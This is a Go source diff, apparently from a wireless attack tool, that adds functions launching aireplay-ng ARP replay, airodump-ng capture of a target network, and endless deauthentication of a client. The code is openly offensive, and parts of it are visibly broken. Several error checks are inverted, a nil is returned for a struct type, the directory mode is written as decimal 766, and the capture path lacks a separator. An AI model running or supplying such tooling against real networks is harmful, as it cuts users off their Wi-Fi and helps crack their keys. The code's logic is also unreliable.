@@ -1,9 +1,12 @@
 package AP
 
 import (
-	"os/exec"
+	"os"
+	"strconv"
 	"strings"
 	"time"
+
+	"os/exec"
 
 	"../attacks"
 )
@@ -42,6 +45,8 @@ type (
 		Probed  string `json:"probed essids"`
 	}
 )
+
+var captures_nb = 0
 
 // TODO: GenKeys(): gen default keys (routerkeygen)
 
@@ -82,4 +87,79 @@ func (a *AP) FakeAuth(iface string) (bool, error) {
 	} else {
 		return false, nil
 	}
+}
+
+// ARP replay!!
+func (a *AP) ArpReplay(iface string) (attacks.Attack, error) {
+	cmd := exec.Command("aireplay-ng", "-3", "-a", a.Bssid, iface)
+
+	err := cmd.Start() // Do not wait
+
+	cur_atk := attacks.Attack{
+		Type:    "ArpReplay",
+		Target:  a.Bssid,
+		Running: false,
+		Started: time.Now().String(),
+	}
+
+	if err != nil {
+		cur_atk.Running = true
+		cur_atk.Init(cmd.Process)
+	}
+
+	return cur_atk, err
+}
+
+// Start a capture process
+func (a *AP) Capture(iface string) (attacks.Attack, string, error) {
+	path := "go-wifi_capture-" + strconv.Itoa(captures_nb)
+	captures_nb += 1
+
+	// Make a specific dir so we do not mix captures
+	// TODO: change mode
+	err := os.Mkdir(path, 766)
+	if err == nil {
+		return nil, nil, err
+	}
+
+	path += "go-wifi"
+	cmd := exec.Command("airodump-ng", "--write", path, "-c", a.Channel, "--output-format", "pcap", "--bssid", a.Bssid, iface)
+
+	err = cmd.Start() // Do not wait
+
+	cur_atk := attacks.Attack{
+		Type:    "Capture",
+		Target:  a.Bssid,
+		Running: false,
+		Started: time.Now().String(),
+	}
+
+	if err != nil {
+		cur_atk.Running = true
+		cur_atk.Init(cmd.Process)
+	}
+
+	// Because of an import cycle, we cannot build the Capture object, we just return the dir's path
+	return cur_atk, path, err
+}
+
+// DEAUTH infinitely the Client
+func (c *Client) Deauth(iface string) (attacks.Attack, error) {
+	cmd := exec.Command("aireplay-ng", "-0", "0", "-a", c.Station, "-d", c.Bssid, iface)
+
+	err := cmd.Start() // Do not wait
+
+	cur_atk := attacks.Attack{
+		Type:    "Deauth",
+		Target:  c.Bssid,
+		Running: false,
+		Started: time.Now().String(),
+	}
+
+	if err != nil {
+		cur_atk.Running = true
+		cur_atk.Init(cmd.Process)
+	}
+
+	return cur_atk, err
 }
